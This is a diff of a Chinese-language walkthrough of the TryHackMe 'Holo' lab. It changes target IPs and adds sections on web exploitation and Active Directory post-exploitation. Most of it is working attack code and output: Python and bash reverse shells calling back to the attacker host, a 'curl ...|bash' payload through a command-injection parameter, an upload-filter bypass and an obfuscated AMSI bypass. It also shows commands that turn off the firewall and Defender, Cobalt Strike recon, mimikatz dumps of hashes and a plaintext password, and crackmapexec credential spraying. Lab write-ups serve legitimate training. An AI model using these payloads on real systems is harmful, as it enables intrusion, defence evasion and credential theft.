@@ -5,10 +5,10 @@
 ![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/1658482726896.jpg)
 
 ```
-nmap -sV -sC -p- -v 10.200.112.0/24
+nmap -sV -sC -p- -v 10.200.114.0/24
 ...
 ...
-Nmap scan report for 10.200.112.33
+Nmap scan report for 10.200.114.33
 Host is up (0.094s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT      STATE SERVICE VERSION
@@ -99,19 +99,19 @@ Nmap done: 256 IP addresses (2 hosts up) scanned in 103.26 seconds
 ```
 
 有两个IP有返回：
-1. ```10.200.112.33```
+1. ```10.200.114.33```
 返回端口服务：22,80,33060
 
-2. ```10.200.112.250```
+2. ```10.200.114.250```
 返回端口服务：22,1337
 
 
-```10.200.112.33```详细端口信息
+```10.200.114.33```详细端口信息
 ```
 ┌──(root㉿rock)-[~]
-└─# nmap -sV -Pn -A -O 10.200.112.33 -p 22,80,33060
+└─# nmap -sV -Pn -A -O 10.200.114.33 -p 22,80,33060
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 23:50 EDT
-Nmap scan report for 10.200.112.33
+Nmap scan report for 10.200.114.33
 Host is up (0.075s latency).
 
 PORT      STATE SERVICE VERSION
@@ -174,24 +174,24 @@ Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds
 
 ```
 
-## 10.200.112.33 Recon
+## 10.200.114.33 Recon
 
 ```
 ┌──(root㉿rock)-[~/thm/holo]
-└─# python3 /root/dirsearch/dirsearch.py -e* -t 100 -u http://10.200.112.33      
+└─# python3 /root/dirsearch/dirsearch.py -e* -t 100 -u http://10.200.114.33      
   _|. _ _  _  _  _ _|_    v0.4.2.6
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15418
 
-Output File: /root/dirsearch/reports/10.200.112.33/_22-07-24_23-48-41.txt
+Output File: /root/dirsearch/reports/10.200.114.33/_22-07-24_23-48-41.txt
 
-Target: http://10.200.112.33/
+Target: http://10.200.114.33/
 
 [23:48:41] Starting: 
 [23:50:32] 200 -   19KB - /license.txt 
 [23:50:52] 200 -    7KB - /readme.html                                        
-[23:50:52] 301 -    0B  - /rating_over.  ->  http://10.200.112.33/rating_over 
+[23:50:52] 301 -    0B  - /rating_over.  ->  http://10.200.114.33/rating_over 
 [23:50:54] 200 -  913B  - /robots.txt    
 [23:51:15] 200 -    0B  - /wp-content/                                        
 [23:51:16] 200 -    0B  - /wp-config.php     
@@ -206,8 +206,8 @@ Target: http://10.200.112.33/
 
 把```www.holo.live```和```holo.live```添加进hosts文件
 
-```echo "10.200.112.33 www.holo.live">> /etc/hosts```
-```echo "10.200.112.33 holo.live">> /etc/hosts```
+```echo "10.200.114.33 www.holo.live">> /etc/hosts```
+```echo "10.200.114.33 holo.live">> /etc/hosts```
 
 
 robots.txt暴露了一些文件和站点路径
@@ -254,7 +254,7 @@ _______________________________________________________________
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 
-[+] URL: http://www.holo.live/ [10.200.112.33]
+[+] URL: http://www.holo.live/ [10.200.114.33]
 [+] Started: Mon Jul 25 03:31:22 2022
 
 Interesting Finding(s):
@@ -386,10 +386,10 @@ Found: admin.holo.live (Status: 200) [Size: 1845]
 
 得到两个新的domain：```dev.holo.live```,```admin.holo.live```,把这两个domain加进hosts文件
 ```
-10.200.112.33 www.holo.live
-10.200.112.33 holo.live
-10.200.112.33 dev.holo.live
-10.200.112.33 admin.holo.live
+10.200.114.33 www.holo.live
+10.200.114.33 holo.live
+10.200.114.33 dev.holo.live
+10.200.114.33 admin.holo.live
 ```
 
 ** Web App Exploitation Punk Rock 101 err Web App 101**
@@ -550,7 +550,7 @@ www-data
 
 使用下面payload
 ```
-http://admin.holo.live/dashboard.php?cmd=python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.50.109.139",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+http://admin.holo.live/dashboard.php?cmd=python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.50.111.108",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 ```
 
 拿到一个rev shell
@@ -558,7 +558,7 @@ http://admin.holo.live/dashboard.php?cmd=python3 -c 'socket=__import__("socket")
 ┌──(root💀kali)-[~/tryhackme/holo]
 └─# nc -lnvp 4242            
 listening on [any] 4242 ...
-connect to [10.50.109.139] from (UNKNOWN) [10.200.112.33] 52394
+connect to [10.50.111.108] from (UNKNOWN) [10.200.114.33] 52394
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
@@ -716,8 +716,8 @@ for port in portList:
 
 传到靶机
 ```
-www-data@9b49d5e2bc5e:/tmp$ curl http://10.50.109.139/scan.py -o scan.py
-curl http://10.50.109.139/scan.py -o scan.py
+www-data@9b49d5e2bc5e:/tmp$ curl http://10.50.111.108/scan.py -o scan.py
+curl http://10.50.111.108/scan.py -o scan.py
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   289  100   289    0     0    642      0 --:--:-- --:--:-- --:--:--   642
@@ -804,8 +804,8 @@ www-data
 使用下面命令测试
 
 ```
-www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=wget http://10.50.109.139/any
-<00.1:8080/cmd.php?cmd=wget http://10.50.109.139/any
+www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=wget http://10.50.111.108/any
+<00.1:8080/cmd.php?cmd=wget http://10.50.111.108/any
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
         "http://www.w3.org/TR/html4/strict.dtd">
 <html>
@@ -828,8 +828,8 @@ www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=wget h
 ┌──(root💀kali)-[~/tryhackme/holo]
 └─# python3 -m http.server 80                                                                                   1 ⨯
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.200.112.33 - - [26/Jul/2022 03:38:05] code 404, message File not found
-10.200.112.33 - - [26/Jul/2022 03:38:05] "GET /any HTTP/1.1" 404 -
+10.200.114.33 - - [26/Jul/2022 03:38:05] code 404, message File not found
+10.200.114.33 - - [26/Jul/2022 03:38:05] "GET /any HTTP/1.1" 404 -
 
 ```
 
@@ -839,7 +839,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ┌──(root💀kali)-[~/tryhackme/holo]
 └─# cat rev.sh
 #!/bin/bash
-bash -i >& /dev/tcp/10.50.109.139/4242 0>&1
+bash -i >& /dev/tcp/10.50.111.108/4242 0>&1
 ```
 
 本地起一个web server
@@ -850,13 +850,13 @@ rev shell放在一个bash脚本里的好处是可以规避一些引号和特殊�
 
 使用下面payload
 ```
-curl http://192.168.100.1:8080/cmd.php?cmd=curl http://10.50.109.139/rev.sh|bash &
+curl http://192.168.100.1:8080/cmd.php?cmd=curl http://10.50.111.108/rev.sh|bash &
 ```
 
 注意，cmd后面的命令要用urlencode转一次，规避特殊符号引起的麻烦
 
 ```
-curl http://192.168.100.1:8080/cmd.php?cmd=curl%20http%3A%2F%2F10.50.109.139%2Frev.sh%7Cbash%20%26
+curl http://192.168.100.1:8080/cmd.php?cmd=curl%20http%3A%2F%2F10.50.111.108%2Frev.sh%7Cbash%20%26
 ```
 
 横向到```L-SRV01```
@@ -864,7 +864,7 @@ curl http://192.168.100.1:8080/cmd.php?cmd=curl%20http%3A%2F%2F10.50.109.139%2Fr
 ┌──(root💀kali)-[~/tryhackme/holo]
 └─# nc -lnvp 4242
 listening on [any] 4242 ...
-connect to [10.50.109.139] from (UNKNOWN) [10.200.112.33] 48736
+connect to [10.50.111.108] from (UNKNOWN) [10.200.114.33] 48736
 bash: cannot set terminal process group (1845): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@ip-10-200-112-33:/var/www/html$ whoami
@@ -880,7 +880,7 @@ ip a
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
     link/ether 02:69:87:5e:18:71 brd ff:ff:ff:ff:ff:ff
-    inet 10.200.112.33/24 brd 10.200.112.255 scope global dynamic eth0
+    inet 10.200.114.33/24 brd 10.200.112.255 scope global dynamic eth0
        valid_lft 3441sec preferred_lft 3441sec
     inet6 fe80::69:87ff:fe5e:1871/64 scope link 
        valid_lft forever preferred_lft forever
@@ -1001,7 +1001,7 @@ kali执行
 
 客户端执行
 ```
-./chisel client 10.50.109.139:8000 R:socks
+./chisel client 10.50.111.108:8000 R:socks
 ```
 
 ```/etc/proxychains4.conf```配置
@@ -1013,19 +1013,19 @@ socks5  127.0.0.1 1080
 ssh登录
 ```
 ┌──(root💀kali)-[~]
-└─# proxychains ssh linux-admin@10.200.112.33                                                                                                                                                                                         255 ⨯
+└─# proxychains ssh linux-admin@10.200.114.33                                                                                                                                                                                         255 ⨯
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.16
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9050 <--socket error or timeout!
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9051 <--socket error or timeout!
-[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.112.33:22  ...  OK
-The authenticity of host '10.200.112.33 (10.200.112.33)' can't be established.
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.114.33:22  ...  OK
+The authenticity of host '10.200.114.33 (10.200.114.33)' can't be established.
 RSA key fingerprint is SHA256:43K5xtSCUtS9tdIFuE60lTb3CLW0O+cPzfiGDj2oCFg.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.200.112.33' (RSA) to the list of known hosts.
-linux-admin@10.200.112.33's password: 
+Warning: Permanently added '10.200.114.33' (RSA) to the list of known hosts.
+linux-admin@10.200.114.33's password: 
 Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1042,7 +1042,7 @@ Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)
   Users logged in:                  0
   IPv4 address for br-19e3b4fa18b8: 192.168.100.1
   IPv4 address for docker0:         172.17.0.1
-  IPv4 address for eth0:            10.200.112.33
+  IPv4 address for eth0:            10.200.114.33
 
   => / is using 97.3% of 7.69GB
   => There is 1 zombie process.
@@ -1089,10 +1089,265 @@ PORT     STATE SERVICE       VERSION
 ```
 
 
-
-
 浏览器配置FoxyProxy，走socks5协议
 ![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659082497815.png)
 
 打开S-SRV01所在的web 服务器,又是一个holo.live的登录页
 ![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659082657504.jpg)
+
+点击Forgot password，输入数据库里找到的另一个用户名：```gurag```，在浏览器打开f12调试，查看发送过去服务器的包
+
+![img](1659580867657.jpg)
+
+在浏览器调试工具的```storage->user_token->size```得到cookie大小：110
+
+看到生成了一个user_token，复制它，作为传入参数放到url上的user_token
+
+![img](1659580975880.jpg)
+
+
+此时来到一个密码reset页面，输入我们重置的密码
+
+![img](1659581100182.jpg)
+
+
+**Task 28  Web App Exploitation Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens**
+
+> What user can we control for a password reset on S-SRV01?
+
+> gurag
+
+> What is the name of the cookie intercepted on S-SRV01?
+
+> user_token
+
+> What is the size of the cookie intercepted on S-SRV01?
+
+> 110
+
+> What page does the reset redirect you to when successfully authenticated on S-SRV01?
+
+> reset.php
+
+用修改的密码登陆web站点以后是一个上传页面，查看网页源代码，发现上传的过滤放在了客户端
+```
+<script>
+      window.onload = function() {
+        var upload = document.getElementById("fileToUpload");
+        upload.value="";
+        upload.addEventListener("change",function(event) {
+          var file = this.files[0];
+          if (file.type != "image/jpeg") {
+            upload.value="";
+            alert("dorkstork server bork");
+          }
+        });
+      };
+    </script>
+```
+
+利用burp很容易就可以绕过
+
+![img](1659593558274.jpg)
+
+在```images```这个文件夹可以访问到我们上传到php文件
+
+![img](1659593622049.jpg)
+
+
+现在上传一个win版本的rev.php，拿到一个shell
+```
+┌──(root💀kali)-[~/tryhackme/holo]
+└─# nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.50.111.108] from (UNKNOWN) [10.200.114.31] 49896
+SOCKET: Shell has connected! PID: 528
+Microsoft Windows [Version 10.0.17763.1518]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\web\htdocs\images>whoami
+nt authority\system
+
+C:\web\htdocs\images>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : holo.live
+   Link-local IPv6 Address . . . . . : fe80::81b0:9f04:18cc:b3a0%6
+   IPv4 Address. . . . . . . . . . . : 10.200.114.31
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.200.114.1
+
+C:\web\htdocs\images>
+
+```
+
+绕过PS执行策略以及AMSI
+```
+C:\web\htdocs\images>powershell -ep bypass
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\web\htdocs\images> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+PS C:\web\htdocs\images> 
+```
+
+关闭防火墙和实时防护
+```
+PS C:\web\htdocs\images> NetSh Advfirewall set allprofiles state off
+Ok.
+
+PS C:\web\htdocs\images> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
+PS C:\web\htdocs\images> 
+
+```
+
+## Post Exploitation
+
+开启CS
+
+![img](1659594856781.jpg)
+
+
+拿到一个beacon
+
+![img](1659595176870.jpg)
+
+域信息枚举
+
+引入powervie，获取当前域
+```
+beacon> powershell-import tools/PowerView.ps1
+[*] Tasked beacon to import: /root/CobaltStrike/tools/PowerView.ps1
+[+] host called home, sent: 143784 bytes
+beacon> powershell Get-Domain
+[*] Tasked beacon to run: Get-Domain
+[+] host called home, sent: 297 bytes
+[+] received output:
+#< CLIXML
+
+
+Forest                  : holo.live
+DomainControllers       : {DC-SRV01.holo.live}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : DC-SRV01.holo.live
+RidRoleOwner            : DC-SRV01.holo.live
+InfrastructureRoleOwner : DC-SRV01.holo.live
+Name                    : holo.live
+
+```
+
+获取DC
+```
+beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
+[*] Tasked beacon to run: Get-DomainController | select Forest, Name, OSVersion | fl
+[+] host called home, sent: 425 bytes
+[+] received output:
+#< CLIXML
+
+
+Forest    : holo.live
+Name      : DC-SRV01.holo.live
+OSVersion : Windows Server 2019 Datacenter
+```
+
+获取域内所有计算机
+```
+beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+[*] Tasked beacon to run: Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+[+] host called home, sent: 461 bytes
+[+] received output:
+#< CLIXML
+
+dnshostname           
+-----------           
+DC-SRV01.holo.live    
+PC-FILESRV01.holo.live
+S-SRV01.holo.live     
+S-SRV02.holo.live   
+```
+
+获取所有DA
+```
+beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
+[*] Tasked beacon to run: Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
+[+] host called home, sent: 481 bytes
+[+] received output:
+#< CLIXML
+
+
+
+MemberDistinguishedName                                           
+
+-----------------------                                           
+
+CN=Shirikami Fubuki,OU=Administration,OU=Employees,DC=holo,DC=live
+
+CN=Inugami Korone,OU=Administration,OU=Employees,DC=holo,DC=live  
+
+CN=SRV ADMIN,OU=Service Accounts,OU=Employees,DC=holo,DC=live     
+
+CN=Administrator,CN=Users,DC=holo,DC=live  
+```
+
+DA成员包括：Shirikami Fubuki,Inugami Korone,SRV ADMIN,Administrator
+
+
+使用mimikatz dump出机器里的登录密码
+```
+beacon> mimikatz sekurlsa::logonpasswords
+[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+[+] host called home, sent: 750714 bytes
+[+] received output:
+
+Authentication Id : 0 ; 310162 (00000000:0004bb92)
+Session           : Interactive from 1
+User Name         : watamet
+Domain            : HOLOLIVE
+Logon Server      : DC-SRV01
+Logon Time        : 8/4/2022 5:42:25 AM
+SID               : S-1-5-21-471847105-3603022926-1728018720-1132
+  msv : 
+   [00000003] Primary
+   * Username : watamet
+   * Domain   : HOLOLIVE
+   * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
+   * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
+   * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
+  tspkg : 
+  wdigest : 
+   * Username : watamet
+   * Domain   : HOLOLIVE
+   * Password : (null)
+  kerberos :  
+   * Username : watamet
+   * Domain   : HOLO.LIVE
+   * Password : Nothingtoworry!
+  ssp : 
+  credman : 
+```
+
+找到一个用户的明文密码：```watamet : Nothingtoworry! ```
+
+
+使用cme验证上面的用户密码,扫描AD所在网段（我这里是114）有权限的机器
+
+```
+proxychains crackmapexec smb 10.200.114.0/24 -u watamet -d holo.live -p 'Nothingtoworry!'
+
+<skip..>
+
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.114.157:445 SMB         10.200.114.31   445    S-SRV01          [+] holo.live\watamet:Nothingtoworry! (Pwn3d!)
+SMB         10.200.114.30   445    DC-SRV01         [+] holo.live\watamet:Nothingtoworry!
+```
+
+对```10.200.114.31```有管理员权限
+
+再次验证
